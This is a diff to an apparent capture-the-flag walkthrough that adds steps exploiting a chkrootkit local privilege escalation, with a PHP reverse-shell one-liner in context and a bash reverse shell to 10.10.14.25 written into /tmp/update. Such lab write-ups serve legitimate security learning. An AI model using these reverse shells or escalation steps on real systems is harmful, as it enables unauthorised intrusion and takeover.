@@ -164,4 +164,13 @@ php -r '$sock=fsockopen("10.10.14.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ![image](https://user-images.githubusercontent.com/83878909/234613642-752c8e5c-3627-4b75-ac35-c4df4ae970c9.png)
 
   - [Local Privilege Escalation - chkrootkit](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
+  - File `/tmp/update`.
+![image](https://user-images.githubusercontent.com/83878909/234626907-67a484f8-2f0c-40f9-99a9-0774d4558190.png)
 
+```CSS
+▶ echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/10.10.14.25/443 0>&1' > update
+```
+```CSS
+▶ chmod +x update
+```
+![image](https://user-images.githubusercontent.com/83878909/234643255-71371280-116e-49ed-8584-e7aa1d48dd59.png)
